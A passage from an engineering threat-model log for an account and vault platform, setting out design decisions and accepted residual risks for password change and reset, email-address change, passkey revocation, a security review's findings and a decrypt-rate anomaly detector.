- *widen the existing VERIFY edge*, whose holder is already identity alone —
  **declined on that edge's own recorded reasoning**. It was split from
  RECIPIENTS so that "the first future holder of a resend capability" would not
  inherit a power it should not have; a support tool or a BFF-side resend is
  exactly that holder, and it must not arrive carrying the ability to tell a user
  their password changed.
- *a fifth edge* — **taken**.

The kind is a SYSTEM kind and, within that, a member of a narrower
`ACCOUNT_SECURITY_KINDS`. Three send routes now have three disjoint
vocabularies, each schema built from its own list, so no holder of one credential
can fire another's. The body carries **no variables at all** — not even a
timestamp, though "changed at 14:02" would read better — because the moment this
wire carries one, a holder chooses part of what the user reads.

### Residuals, stated rather than implied

- **[ACCEPTED]** *The notice is best-effort and its failure is recorded, not retried.* The
  change commits first; a notification that cannot be delivered leaves
  `notified: failed` on the audit event (the M13 `ownerNotified` shape) for an
  operator to re-drive. Sending first would risk telling someone their password
  changed when it had not. **ACCEPTED BY M40 PR2** (§6fff): the ordering is the
  decision, not a gap — commit-then-notify is the correct arm, the failure is
  recorded on the audit event rather than dropped, and the only thing the M21 tag
  ever added was an operator to re-drive it by hand.
- **[ACCEPTED]** *An attacker who has BOTH the password and a fresh step-up can change it.* That
  is not a gap this route can close — it is the definition of holding the
  account — and what bounds it is the notice, the audit event, and the fact that
  every other session dies in the same transaction, so the owner's own client
  discovers it at once.
- **[ACCEPTED]** *A password change does not touch the VAULT.* The Zone A master key derives
  from the vault password and Secret Key under 2SKD, never from the account
  password. Nothing here re-keys, re-wraps or invalidates anything in Zone A,
  and no surface says otherwise (PR3 owes the same statement, more loudly,
  because a RESET is where a user is most likely to assume it).
- **[ACCEPTED]** *`auth_events` gains `password.changed` and `password.change_failed`, and
  deliberately NOT `stepup.granted`.* That literal is hardcoded in the
  owner-liveness interlock, so emitting it would silently void an open §5.1 death
  case as a side effect — a policy decision taken by accident and a capability
  handed to whoever completed the change.
- **[ACCEPTED]** *The route is account-audience only.* A vault or extension session cannot
  replace the credential that mints it; a leaked derived credential must not be
  able to chain itself into permanent control, which survives revoking the
  credential that did it.
- **[CLOSED: §6m]** *Still no reset.* A user who has FORGOTTEN their password cannot use this
  route, by construction — it requires the current one. That is PR3.

## 6m. Threat-model delta — M17 PR3, the password reset (2026-08-13)

**A user who has forgotten their password had no way back.** PR2 gave the
platform a password CHANGE, which requires the current password by
construction; this is the other half, and it is the most dangerous route the
milestone adds — an unauthenticated ceremony that replaces the credential
everything else rests on.

**It mints nothing.** Redemption sets the password and returns no tokens, no
session, no step-up; the user signs in afterwards with what they chose. That is
the answer to "does redeeming a reset code grant step-up?" made *structural*
rather than kept as a rule: there is nothing to grant it to. The M15 PR4 review
is why it matters — an unauthenticated redeem route that granted step-up let a
stolen 60-second handoff code reach `POST /v1/vault/reset`, which is gated on
step-up alone, and crypto-shred a Zone A vault. A reset code granting step-up
would be that primitive delivered by email to a code that lives thirty minutes.
`test/mint-paths.spec.ts` asserts the set of session-minting paths and proves the
reset absent from it.

**A fourth `recovery` audience would not have helped.**
`AllowSessionAudiences` unconditionally prepends `account` and identity binds no
service-wide list, so a completion route admitting `recovery` would *also* be
reachable by every ordinary account session — a
set-a-new-password-without-the-current-one route behind any stolen bearer.

### THE DECISION THAT MOST WEAKENS THIS: no second factor

**A reset requires the mailed code and nothing else, even for an account holding
a verified TOTP or passkey.** Taken deliberately, and the consequence is stated
plainly rather than softened:

> For an account with a verified second factor, control of the mailbox is
> control of the account. A verified second factor does **not** protect against
> mailbox compromise.

That is a real weakening of M16's investment in step-up, and it buys one thing:
nobody is ever permanently locked out. The alternative — requiring the factor —
would leave a user who forgot their password *and* lost their authenticator with
no self-service path and no operator remedy, because TB7 does not exist and
there are no recovery codes. What bounds the damage, and none of it is
speculative:

- **the vault is untouched.** Zone A's master key derives from the vault
  password and Secret Key under 2SKD, never from the account password. A reset
  re-keys, re-wraps and opens nothing there, and the mailed body says so in
  words, because the vault origin already tells users Estate cannot reset that
  password for them.
- **every session is revoked**, so the real owner is signed out and notices.
- **the owner is mailed** on completion, on the M17 PR2 account-security edge.
- the whole sequence is on the audit trail: requested, completed, and every
  refusal.

PR5 (the passkey surface) revisited this and RE-DECLINED it, for the reason
recorded in §6o: requiring a passkey at reset turns lost-passkey-plus-forgotten-
password into a permanent lockout with no recovery codes and no TB7. A
recovery-codes ceremony remains the change that could strengthen this without
that trade; until then it is the platform's weakest link on risk #1 and should
be read as such.

### The rest of the shape

- **[OWNER: M29]** **The request route is enumeration-safe by CONSTRUCTION, not by policy.** It
  answers `202` for every input and does the work off the response path — the
  mint-and-send is fired without being awaited — so an address with an account
  cannot answer measurably later than a stranger's. Register's own docstring
  records that timing residual as still open; this route avoids inheriting it,
  which matters more here because a hit tells an attacker where to point a
  mailbox compromise.
- **Two bounds, and the per-address one is primary.** The per-account re-issue
  floor (30 min) can only be evaluated once an address resolves to a user, so it
  sees nothing at all for an address with no account — most of what an abuser
  sends. The per-address bound (10 per 15 min, in memory, per process) refuses
  before any lookup. Its refusal is SILENT, because the route tells a caller
  nothing either way.
- **The status allowlist rides the UPDATE.** `deceased_pending` is permitted
  (§5.1's rescue path is the living owner signing back in); `settlement` is
  refused, so whoever controls a decedent's mailbox cannot recover a terminally
  locked account.
- **Its own ledger kinds, never `stepup.granted`** — that literal is the
  owner-liveness interlock, so emitting it would silently void an open §5.1
  death case and hand that capability to whoever reads the mailbox.
- **A sixth notifications edge** (`NOTIFICATIONS_RECOVERY_INTERNAL_TOKEN`,
  identity alone). Not the VERIFY edge despite the identical holder and a
  near-identical payload: a verification code proves a mailbox and is redeemed
  by somebody already signed in, while a reset code is redeemed with no session
  at all. Four send routes now build from four closed kind lists, so no holder
  of one can fire another's.
- **Atomicity is the control.** Spending the code, writing the hash and revoking
  the sessions are one transaction: a spend without the write burns the user's
  only recovery code, and a write without the spend leaves the code replayable
  by whoever read that mailbox.

### Residuals

- **[ACCEPTED]** *The reset does not clear PR1's login bound.* A user locked out of NEW logins
  by a sustained wrong-password attack can reset successfully and still be
  refused at login until that window lapses (15 minutes). Emitting a
  `login.succeeded` to clear it would be a lie in the ledger, and the window is
  short enough that waiting is the honest remedy.
- **[CLOSED: §6w]** *There is no reset SURFACE.* PR3 ships the routes; no BFF resolver and no
  screen call them, so this is a zero-callers gap of exactly the kind this repo
  keeps closing — recorded here rather than discovered later. The same is true
  of PR2's change route. **CLOSED**: the change route by M20 PR1 (§6u), the
  address change by M20 PR2 (§6v), the reset by M20 PR3 (§6w).
- **[OWNER: E1]** *An unauthenticated route now causes mail.* §6h refused to fire a notification
  kind at registration for that reason, and PR1 narrowed only half of that
  refusal. The deviation is argued rather than inherited: the bound above is
  per-process and best-effort, so what actually keeps this route from being a
  mail-bomb primitive is the per-account floor of one code per thirty minutes,
  which applies to the address being mailed rather than to the caller.
- **[OWNER: E1]** *No attempt cap on redemption*, deliberately: the redeemer is unauthenticated
  and a wrong guess resolves no row, so a counter keyed on a resolved row would
  be the decorative cap the M14 round-2 review found. The bound is 160 bits, a
  30-minute TTL, and burn-on-attempt.
- **[CLOSED: §6n]** *The address-change lockout §6h records is NOT closed by this.* A reset mails
  to the address already on file, so for a user who mistyped their address at
  registration it changes nothing. CLOSED by PR4 — see §6n.

**Proven live, and one defect the whole suite passed over.** Driven end to end
against the running stack: a request answers 202 for an address with an account
and for one without, a real SES message carries the `PR1-…` code, the code
RETYPED THE WAY A HUMAN RETYPES IT (lowercase, grouping dashes dropped) is
accepted, the old password stops working, the session held before the reset
answers 401, a replay is refused, and `notification_sends` records the send
while `password_resets` holds a 32-byte digest that does not contain the code.
Every refusal — wrong code, mis-shaped code, replay — is one `invalid_code` on
the wire AND `{}` detail with a null actor in the audit trail, so the trail
does not re-create the oracle the uniform answer removes. The owner is told
their password changed by PR2's account-security notice, which fires on the
reset path too.

The first drive found that the ceremony COULD NOT COMPLETE. `sendPasswordReset`
emitted `{userId, code}` at a route whose `RecoverySchema` is `.strict()` and
requires `kind`, so every send answered 400 — and because identity retires a
code whose send fails, the code was minted, mailed nowhere and revoked. The
whole PR was inert in production while 27 tests passed over it, because the wire
body is declared TWICE and each side's suite validated its own declaration: the
client spec asserted method, URL and credential but never the body, and its own
fixture used a code the pattern rejects; the service specs built valid payloads
by hand. Nothing put one side's OUTPUT into the other side's PARSER. Closed by
`apps/services/notifications/test/wire-parity.spec.ts`, which drives the real
client over a recording transport and parses each emitted body with the schema
its route really uses — derived from the client prototype in one direction and
from the controller source in the other, so an added method or a renamed path
turns it red.

## 6n. Threat-model delta — M17 PR4, the address change (2026-08-13)

**What shipped.** The first way to change a sign-in address in the product's
history: `POST /v1/auth/email/change/request` (stage + mail a challenge),
`POST /v1/auth/email/change` (redeem + switch), `DELETE /v1/auth/email/change`
(withdraw, ungated — the M6 asymmetry). Ten identity routes existed for
credentials and none touched the address; §6h recorded the consequence as a
permanent lockout for anyone who mistyped at registration.

**VERIFY-THEN-SWITCH, and the ordering is the whole design.** Login resolves
users by `email_bidx`, so a change that stored an unproven address would lock
its owner out of LOGIN ITSELF — a typo'd new address must never reach `users`
until a code mailed to it comes back. Consequences, each structural rather than
procedural:

- The old address — login, notifications, everything — keeps working until the
  proof lands. An abandoned or mistyped change costs nothing.
- The M14 forward commitment ("clear `verified_at` in the same statement") is
  discharged one step STRONGER than it asked: no unproven address ever reaches
  the delivery store, so the bit is never cleared — the store's new
  `replace` statement swaps the address and stamps the proof together, and
  there is no moment when the store vouches for an address nobody proved.
- The staged address is encrypted at request time as `users.email` under the
  account's live DEK, so the switch moves CIPHERTEXT — no decrypt inside the
  transaction, and a key rotated or shredded mid-ceremony refuses the switch
  via a `dek_id` predicate restated inside the UPDATE itself.

**The gate is PR2's, verbatim, with §6m's own sentence as the reason:** control
of the mailbox is control of the account, so choosing the mailbox IS choosing
the account's owner of last resort. Current password (a stolen session lacks
it) + conditional step-up (a stolen password lacks it), factor asked FIRST so
the route is not a free password oracle.

**The seventh notifications edge** (`NOTIFICATIONS_EMAIL_CHANGE_INTERNAL_TOKEN`,
holder identity alone) exists because the challenge is INEXPRESSIBLE on every
prior wire: every other send resolves its destination from the encrypted
recipient store by user id, and this ceremony is by definition a challenge to a
mailbox the store does not hold. The edge's grant owns the deviation plainly —
it is the ONE send whose payload names a destination. What bounds it: the body
is doctrine-clean (the code and fixed words, no links, the uniform subject),
the notifications service uses the address for one delivery and STORES NOTHING
(no recipient row is created, read or touched — pinned by an int case), and
the code it mails completes nothing without the account's current password and
a fresh second factor. Widening VERIFY instead was rejected because its
recorded grant — "can only mail a code to whatever address is already on
file" — is precisely the property a future resend-tool holder must keep
inheriting.

**What completion sweeps, in ONE transaction with the switch:** outstanding
password-reset and address-verification codes (both were mailed to the mailbox
being left; a `PR1-` code that outlived the address it was mailed to would hand
whoever reads the OLD mailbox the account the owner just moved away from —
§6m's obligation, discharged), and every session but the caller's (the PR2
posture: the attacker's sessions and the owner's other devices cannot be told
apart).

**The old-address notice is an ORDERING property, not a wire property.** After
the switch commits, identity sends `identity.email_changed` (account-security
wire, carries nothing) BEFORE replacing the recipient — so the store still
resolves the address being LEFT, and the notice reaches the only mailbox whose
reader can dispute a takeover. The copy does not offer "sign in" as the remedy,
because after the change that reader structurally cannot: login uses the new
address. Detection is the notice; response is support. Get the ordering
backwards and the takeover notice goes to the attacker's mailbox — an int case
asserts the sequence.

**Anti-enumeration, register's own posture.** "Is this address registered" is a
fact about somebody else's account, so a taken address is a mail that never
arrives behind a uniform 202 — and because the work differs (KMS, inserts, a
carrier hand-off), the availability lookup and everything after it run DETACHED
from the response, pinned at the source (a runtime test cannot tell a fast
await from no await). Redemption's refusals are one `invalid_code` for every
dead reason — including the candidate address having been registered by someone
else during the 30-minute window, where "taken" would leak the other account
(that refusal burns no attempt: the code was right, the world changed).

**Bounds.** Per-account floor of five minutes between mints (M14's number —
the caller is authenticated and has proved password + factor), keyed on the
LAST MINT so a failing carrier cannot evaluate the floor away; a per-process,
per-DESTINATION bound (10/15min, the reset bound's numbers) because every
request may name a different target and the floor cannot see per-mailbox
volume; a per-user attempt cap of five on redemption, attributable BY DESIGN
(the selector is the authenticated caller, so a wrong guess of any shape burns
one attempt on their own live change — the M14 round-2 mechanic designed in
rather than retrofitted); one live change per user via a partial unique index,
retired UNCONDITIONALLY before every mint (the M14-review wedge).

### Residuals

- **[ACCEPTED]** *A stale login re-feed can transiently repoint the store to the just-left
  address.* Login (old address) resolves before the switch commits; its
  fire-and-forget recipient upsert lands after the switch's replacement; the
  store then holds the old address until the next login. Self-healing (the next
  login can only carry the NEW address — the old bidx no longer resolves) and
  not attacker-steerable without the owner's own credentials mid-race. The
  upsert's preserved bit stays sound through this: every address that can
  reach the store is either one the user just signed in with or one the
  ceremony just proved.
- **[ACCEPTED]** *An honest user typing a TAKEN address waits for a mail that never comes.*
  The cost of register's uniform answer, paid here too; the floor is not burned
  for it, so retrying with a corrected address is free.
- **[CLOSED: §6v]** ~~*The routes ship with no surface* — no BFF resolver, no screen.~~
  **CLOSED by M20 PR2 (§6v)**: all three legs now have a product consumer end
  to end, on the M14 PR3 settings page exactly as this line predicted.
- **[OWNER: M46]** *`identity.email_changed`'s reader has no self-service response.* The notice
  reaches the old mailbox, but a hijacked owner cannot sign in (the address
  changed) and cannot reset (the reset mails the NEW address). Their remedy is
  support, which until TB7 means the operator runbook. Recorded plainly: the
  notice is a DETECTION control, not a response one. **RE-OWNED FROM M21 BY M40
  PR2** (§6fff): the remedy is operator-assisted account recovery, which M21's
  scope statement excludes and which §4 assigned to what it called the "M21
  follow-on" — now M46.
  §6v records this same item a second time and is reduced to a cross-reference in
  the same change.

## 6o. Threat-model delta — M17 PR5, the passkey surface (2026-08-13)

**What shipped.** Identity's four WebAuthn relying-party routes — shipped in M2
and unreachable for fifteen milestones — gained their first consumers: BFF
resolvers and a web surface for registering, naming, listing and revoking
passkeys, and a passkey path in the shared step-up prompt that every
prompt-and-retry caller inherited without a change. Risk #1's "passkey nudges"
residual treatment moves from unbuilt to partially discharged: the surface
exists and nudges nothing yet; a nudge is copy, not machinery, and can follow.

**Two defects fixed in the shipped machinery before the surface landed on it**
(the PR4 pattern): `hasCredentials` — the WebAuthn half of
`SecondFactorGate.holdsVerifiedFactor` — did not filter `revoked_at`, latent
only because nothing wrote that column; the first revoke route would have armed
it, leaving an account whose last passkey was revoked permanently demanding a
factor it could not produce. And the global `credential_id` uniqueness surfaced
as an unhandled 500 when a second account registered the same authenticator;
it is a typed outcome folded into the one generic ceremony refusal now, because
"this authenticator belongs to another account" is a fact about somebody
else's account.

**Revoking a passkey is STEP-UP GATED, and deliberately unlike the ungated M16
session revoke.** Revoking a session only reduces authority. Revoking a FACTOR
weakens the gate that protects everything else: ungated, a stolen bearer strips
the account's factors, `SecondFactorGate` disarms (no factor ⇒ nothing to
prove ⇒ enrolment ungated), and the thief enrols their own — the 2026-08-12
escalation through the back door. The gate is never vacuous by construction
(the account holds at least the factor being removed), and the fence that
verifies it anchors on the controller's real decorators.

**Failed assertions are on the ledger now** (`webauthn.assertion_failed`). The
2026-08-10 decision said they "emit their own kind"; the code emitted nothing —
an investigator reading the ledger for a §5.1 case saw no trace. The kind is
deliberately in NO rate-bound set: a passkey assertion is not brute-forceable,
and counting it would let a flaky authenticator lock out its own owner.

### Residuals

- **[OWNER: M29]** **THE VAULT ORIGIN AND THE EXTENSION ARE TOTP-ONLY FOR STEP-UP**, and a
  passkey-only account therefore cannot complete any Zone A step-up-gated
  ceremony (vault setup, reset, item delete, escrow configure/rearm/revoke,
  recovery-key publish). Three facts stack: vault-web and the extension prove
  factors only through `POST /v1/auth/stepup` (a 6-digit TOTP body); the
  WebAuthn assertion routes are account-audience only; and identity verifies
  assertions against ONE `rpOrigin`, which is the web app's — so extending the
  ceremony to `vault.<domain>` is an identity change (an expectedOrigin list),
  an audience widening, two vault-edge proxy entries and a fence table update,
  not a client patch. The web surface says this ON SCREEN ("keep an
  authenticator app enrolled — the vault currently accepts only authenticator
  codes"), the M16 honesty pattern rather than a docs-only footnote.
- **[ACCEPTED]** *The reset path is re-declined, explicitly* (§6m question 8, owed by this
  PR): a reset still requires the mailed code and nothing else, even for an
  account holding a passkey. Requiring a passkey assertion at reset would turn
  lost-passkey-plus-forgotten-password into a permanent lockout with no
  recovery codes and no TB7 — the same nobody-locked-out-forever reasoning the
  user chose at PR3, unchanged by the surface existing. **ACCEPTED BY M40 PR2**
  (§6fff): a decision twice declined on the same reasoning is a position, not
  debt, and no owner was ever going to discharge it. Its title was also **bold**
  where the overwhelming majority use *italic*, and is italicised here — but an
  earlier draft of this bullet claimed it was the ONLY one, which was false with
  the counter-example in the very next bullet below it: `grep -cE '^- \*\*\[[A-Z][^]]*\]\*\* \*\*'`
  finds **SEVEN** more. The fence does not read a title's emphasis, so nothing
  caught either the divergence or the claim. Recorded rather than swept — the
  remaining seven are not this PR's to normalise, and an earlier draft described
  them wrongly as "other owners' bullets": FIVE carry another owner (M29 ×3, M34,
  M26) and TWO carry no owner at all — one `[CLOSED: §6oo]` and one
  `[ACCEPTED]`. The count was right and the SET was not, which is the failure
  mode this document's own fence guards against by comparing sets. Normalising
  them is M45's, a fence's reach.
- **[OWNER: M29]** **No passwordless login.** The authenticate routes are session-scoped by
  design (M2's deferral, still deliberate): a passkey here is a step-up factor,
  never a login replacement, and discovery-credential login is its own
  milestone with its own enumeration surface.
- **[OWNER: M34]** **Browser-side ceremony failures are invisible to the platform.** A user
  whose sheet keeps failing generates no ledger events until an assertion
  actually reaches identity; only the device knows. Accepted: the alternative
  is client-side telemetry, which this product does not do. **Corrected scope
  (PR6):** this residual only ever covered failures that never reach identity.
  Two SERVER-side branches were also silent — no live challenge, and a
  credential id naming nothing or naming somebody else's authenticator — which
  was a defect rather than this residual, and is fixed in §6p.

## 6p. Threat-model delta — M17 PR6, the security review (2026-08-13)

**How it ran.** Seven file-scoped discovery lenses over the merged M17
machinery — never a diff range (the M13 lesson) — then TWO adversarial
verifiers per deduped candidate on different angles: reachability in a real
production config, and is-it-already-a-documented-decision, both defaulting to
REFUTED. Twelve raw candidates, twelve after dedup, **two confirmed**, ten
refuted. Every confirmed finding was then re-proved BY EXECUTION against the
running stack before a line was changed, and every fix mutation-tested by
reverting it. ELEVENTH milestone running in which every confirmed finding sits
in machinery the milestone introduced, and both falsify a claim it made about
itself.

**(1) `POST /v1/auth/password` VERIFIED A PASSWORD WITH NO BOUND OF ANY KIND.**
Measured on the running stack rather than argued: twenty-five wrong
current-password guesses from one session, twenty-five plain 401s, no refusal
ever, and the twenty-sixth — the right one — took the account over. The same
volume against `POST /v1/auth/login` produced ten `login.failed` and four
`login.rate_limited`. One credential-guessing action, two routes, one bounded.

The gap is exactly the shape of §6k's own framing: PR1 bounded "the routes that
take a password from an UNAUTHENTICATED caller", and the change route reads as
authenticated — except that the entire reason it asks for the current password
is the stolen-session threat, so its caller is the party the bound is for. It
mattered most for FACTORLESS accounts, which `SecondFactorGate` deliberately
lets through (the bootstrap: nothing exists to prove), so nothing else stood in
the way.

`PASSWORD_CHANGE_BOUND` closes it with M16's two scopes, and the per-SESSION
half is the load-bearing one: unlike login there IS a credential at the point
of failure, so a stolen session exhausts its own budget and stops while the
owner's other sessions keep theirs — the escape that could not port to login
ports here. The refusal is a 429 with its own token (safe: the route already
required a resolved, authenticated caller, so it tells them about themselves)
and its own ledger kind, because a refusal counted by the bound that produced
it feeds its own counter. A reset deliberately does not clear the window: it
revokes every session, so the attacker's credential is already dead.

**(2) TWO OF THE FOUR FAILING ASSERTION BRANCHES LEFT NO LEDGER TRACE.** M17
PR5 added `webauthn.assertion_failed` precisely to correct a decision-log entry
claiming failed assertions "emit their own kind" when the code emitted nothing
— and the correction was incomplete. Only the crypto-verify catch and the
`userVerified` recheck recorded; the two branches that short-circuit EARLIEST
stayed silent. Measured: ten probes against a live account (five with no
challenge, five submitting a foreign credential id after minting a real
challenge) produced ZERO `webauthn.*` rows. A credential id naming nothing or
naming somebody else's authenticator is the most suspicious probe class there
is — no browser produces one by accident — and it was the one that was
invisible. All four branches record now; the wire answer stays uniform, so the
trail gains detail the caller does not.

### What the review REFUTED, and why the refutations are worth keeping

Ten candidates were refuted, and two of the refutations are load-bearing:

- **[OWNER: E1]** *"The account-cap refusal skips the in-memory address record, defeating the
  Argon2-cost bound"* — refuted as ALREADY RECORDED. The address bound is
  documented in §6k as per-process, best-effort and evadable; the account bound
  is a durable new-login ceiling, not an Argon2-cost bound, and its one-hash
  cost on a refusing path is stated inline. The residual is real and already
  written down, which is the difference between a finding and a rediscovery.
- *"Historical `users_versions` rows retain the live Argon2id verifier"* —
  refuted on ordering: the migrator applies 001→011 before the app serves, so a
  fresh deploy installs the redacting trigger before any `users` row is ever
  updated, and migration 008's own comment states the pre-migration window and
  why it ships in PR2's commit.

### Residuals

- **[CLOSED: §6oo]** **One novel-but-unreachable candidate is recorded rather than fixed.** A
  crypto-shredded DEK at email-change completion would surface as a 500 rather
  than the uniform `invalid_code` — no code path destroys a DEK today
  (`destroyDek` still has zero callers). It is NOT fixed here on purpose:
  mapping the decrypt failure to `invalid_code` would tell a user "that code
  didn't work" about an account that has been ERASED, and once erasure exists
  the right behaviour is almost certainly that a shredded account cannot reach
  a ceremony route at all (erasure revokes sessions and moves `users.status`
  off the live allowlist, at which point the 500 disappears as a consequence).
  A wrong answer pinned by a test is harder to displace than an absent one, so
  this is filed as a PRECONDITION on the erasure milestone rather than a
  floating residual. **M25 PR4 CHECKED THE PREDICTION AND IT HOLDS — for two
  separate reasons, which the guess did not distinguish.** Session-guarded
  ceremonies are unreachable because a session resolves only for an 'active' or
  'deceased_pending' account. The UNAUTHENTICATED ones hold a code that still
  names a user id, so no session check protects them; what refuses them is the
  status allowlist riding inside `updatePasswordHash`'s own UPDATE, which turns
  the redeem into the same uniform `invalid_code` as every other failure. Both
  layers are now asserted, and the test says which is which.
- **[OWNER: M26]** **Clone detection was the review's other recorded item and is now ANSWERED,
  differently from how it was proposed.** The suggested fix was to revoke the
  credential; the fix taken is to NOTIFY THE OWNER and keep rejecting. The
  counter check is a heuristic: synced passkeys report counter 0 and never
  reach the branch at all (the `storedCounter > 0` guard), so it fires only on
  counter-maintaining authenticators, where a regression is a clone OR a
  firmware/state bug. Auto-revocation would destroy a factor on a hint —
  the M6 rule pointed the wrong way — and on an account with no TOTP it lands
  the owner in exactly the bootstrap-lockout state M17 spent a milestone making
  survivable. `identity.passkey_clone_detected` rides the account-security wire
  (it carries nothing), is sent BEFORE the audit emit so a broker outage cannot
  cancel the warning (the M13 rule), and its delivery outcome rides
  `auth.webauthn.clone_detected` as `notified: delivered|failed` so a warning
  that did not land is visible rather than merely absent. The owner revokes it
  themselves from the surface M17 PR5 shipped.

  **The branch was UNREACHABLE until this change, and only the live drive said
  so.** `@simplewebauthn/server` runs its own counter check inside
  `verifyAuthenticationResponse` and THROWS on a regression, which preempted
  our clone branch and routed every clone into the generic verify catch — so
  the ledger kind, the audit action and (had it shipped as first written) the
  owner's warning were all dead code behind a refusal coming from somewhere
  else. Measured: a forced regression produced two `webauthn.assertion_failed`
  rows and zero `webauthn.clone_detected`. The fix hands the library
  `counter: 0` — its documented "this RP does not track counters" value — so
  this service owns the counter policy and the check runs below, on a VERIFIED
  assertion. That ordering is the security half: checking before verification
  would act on unsigned attacker-supplied bytes and let anyone holding a
  session make the platform mail an owner a clone warning at will. The trigger
  set is unchanged for every reachable state, so no refusal is given up.

  What remains open, stated: a cloned credential stays usable until the owner
  acts, so a later higher-counter assertion from either copy still succeeds.
  That is the deliberate cost of not acting on a heuristic, and the thing that
  would change it is a second signal — not a lower threshold on this one.
- **[ACCEPTED]** **The password-change bound is per-account durable plus per-session durable**,
  both ledger-derived, so unlike the address bound it survives a restart and is
  shared across replicas. It is NOT a global quota and does not bound an
  attacker who can mint sessions — but minting one requires the password, which
  is what they are trying to guess.

## 6q. Threat-model delta — M18 PR2, the decrypt-rate baseline detector (2026-08-13)

**What shipped.** The detection half of §4 TB4's per-principal decrypt-rate
baseline, running in the audit service against the local stack. The detector
derives per-(prefix-class × principal) windowed counts from the append-only
`audit_events` ledger — no counter state an attacker can reset — and emits
`crypto.decrypt_rate.exceeded` through the service's first Kafka producer,
via the sanctioned AuditEmitter path, onto the same topic it consumes: the
anomaly lands in the verified hash chain like any other event. Attribution is
the M18 PR1 registry (the field name's first dotted token); the principal
grain separates the nil-UUID sentinel from every real actor class. Bounds are
fixed reviewed constants set from measured ceilings with a generous
multiplier, and everything OUTSIDE the reviewed table is bound 0 — an
unregistered prefix (`unknown_prefix`) and an unmodelled (prefix × principal)
combination (`unmodeled_principal`) each breach at the first decrypt, because a
read path nobody reviewed is itself the anomaly. *(This sentence named a THIRD
zero until M48 PR3 — settlement's encrypt-only `distributions` (`encrypt_only`).
That class is deleted: `distributions` acquired a read route in M23 PR4b and had
been breaching on every legitimate reveal since. See §6jjj.)*

**The alert sink is the chain plus a structured log line, and deliberately
nothing else.** No owner notification: the reader of this signal is a
security operator who does not exist until TB7, and making audit a
notifications SEND holder would falsify its fenced zero-credential posture.
The event is the durable record; the log line is the operational tail.

**Advisory by construction.** The detector runs on its own Postgres session
(never the ingestor's serialized chain connection), started only from
main.ts so test suites structurally cannot run it, unref'd, with every fault
terminating in its own catch and one log line — a detector error must never
take the path the consumer's death takes, because killing ingest (the paging
signal) over an advisory neighbour inverts the M9 rule twice. Losing the
detector degrades alerting, never safety.

**Episode semantics and the honest residuals.**
- **[ACCEPTED]** A sustained breach emits ONCE per episode and re-arms when its window
  clears. The episode memory is per-process, so a RESTART may re-emit one
  duplicate for a still-breaching principal, and a failed emit is retried
  next tick — in both cases the fail direction is an EXTRA event.
- **[CLOSED: §6q]** CORRECTED BY THE M18 PR3 REVIEW, which found the unqualified
  "never a lost one" false twice over. (a) The reconciliation that ends
  episodes ran after the emit loop inside the same try, so one failed emit
  skipped it: a principal whose episode had cleared stayed marked announced
  and its NEXT genuine episode was suppressed — a lost anomaly, reproduced
  against the real detector. (b) The emit loop shared one try, so the first
  unemittable breach cancelled every later breach in that tick. Both closed
  (per-emit catch; reconciliation moved ahead of anything that can fail —
  and the mutation harness showed the catch is the load-bearing half and the
  ordering the belt, which is recorded in the code rather than assumed).
- **[OWNER: M26]** STILL TRUE AND NOT FIXABLE HERE: an emit outage lasting longer than the
  300s window loses the anomalies raised inside it, because the retry is
  bounded by the window that produced them. Closing it means persisting an
  anomaly before emitting it — a different design, not a patch.
- **[OWNER: E1]** Bounds for classes the M18 PR1 measurement did not exercise (family,
  asset_event, plaid_item, account, assistant_tool_call, users) are
  PROVISIONAL — sized from neighbouring measured economics and marked as such
  in the table; live traffic is what re-calibrates them, by reviewed commit.
- **[ACCEPTED]** A full asset-projection rebuild of a large estate TRIPS the sentinel's
  asset_event bound BY DESIGN: a mass decrypt is the detected class, and the
  operator running one expects the alarm. One event per episode keeps that
  honest rather than noisy.
- **[ACCEPTED]** Detection latency is bounded by tick cadence (60s) plus the broker hop;
  the window (300s) exceeds both, so nothing legitimate hides between ticks.
- **[ACCEPTED]** The stack e2e's gate pairs a POSITIVE control with the false-positive
  assertion: a deliberate burst past the smallest bound must produce exactly
  its own anomaly, and every anomaly in the store must name that deliberate
  bound. A bare zero-events assertion would be vacuously green over a dead
  detector — the M8 dead-consumer shape.

**The window's clock, and what that costs (M18 PR3).** The sweep selects
`occurred_at >= now - 300s`, and `occurred_at` is stamped by the PRODUCING
service at emit time — the ingestor preserves it, and `audit_events` has no
server-authored ingest-time column. Three consequences, recorded rather than
patched, because the honest fix is a schema change (an ingest-time column, or
windowing on the ingest-ordered `seq`) that belongs to the milestone that
needs it:
- Ingest lag or an audit-service outage longer than the window means the
  backlog arrives already outside every future tick's window and is never
  evaluated. The consumer and the detector are one process, so this is
  exactly the state a detector most needs to survive. Fail direction: a
  MISSED alarm, never a false one.
- A producing service whose clock is more than a window slow has its decrypts
  permanently outside the window — that service's prefixes go dark with no
  fault and no log.
- A far-future `occurred_at` is counted in every window indefinitely, and its
  episode never clears, so that principal's later genuine anomalies are
  suppressed. Authoring one needs a grossly misconfigured clock or the
  ability to forge topic messages — a strictly larger break than the §5.3
  adversary this control is credited against.

**What the audit stream cannot see (M18 PR3).** "Every released plaintext is
one audited event" is a property of code that goes THROUGH `FieldCrypto`. The
package also exports the AEAD `open()` and the KMS unwrap, and a Zone B
process holds unwrapped DEKs in a 5-minute cache — so code executing INSIDE a
compromised service (RCE, a malicious dependency, a malicious-insider deploy)
can decrypt without emitting anything, and the DEK cache means it need not
call KMS either. That tier is not what this detector is for: it is the
credential/identity-compromise case that drives the ordinary API, and against
in-process compromise the answers are the enforcement chokepoint (the KMS
grant), image signing and admission control, and §5.3's canaries. §5.3's
control text should be read with that boundary in mind.

**What remains cloud-blocked, stated precisely:** the ENFORCEMENT half —
suspending the KMS grant and paging — needs real IAM and a TB7 operator;
KMS-side rate limiting still bounds bulk UNWRAPS (many-user sweeps), which
the DEK cache never hid; §5.3's canaries and CloudHSM roots are unchanged.

**The detector's own session (M18 PR3).** It is lazily connected, absorbs
connection-level `error` events, and replaces a dead session on the next
tick. Each of those is a review finding rather than a nicety: an unhandled pg
`error` event crashes the whole audit process (reproduced against a real
cluster), which would have let the ADVISORY detector kill INGEST — the paging
signal — and an error listener alone would have traded that crash for
permanent silent deafness, since a pg Client never reconnects. The session
also carries a query timeout, without which a black-holed socket leaves the
re-entrancy guard latched for hours with nothing logged (the M8
dead-consumer shape). The INGEST connection deliberately keeps the opposite
posture: its death is fatal, and it now routes through the service's fatal
path instead of an uncaught exception, so it dies with a structured line and
releases its handles.

**Coverage gap, stated (M18 PR3).** The stack e2e's false-positive gate runs
in the DEVELOPMENT profile only, so the production rehearsal's journey —
escrow arming, settlement intake, vault enrollment under production config —
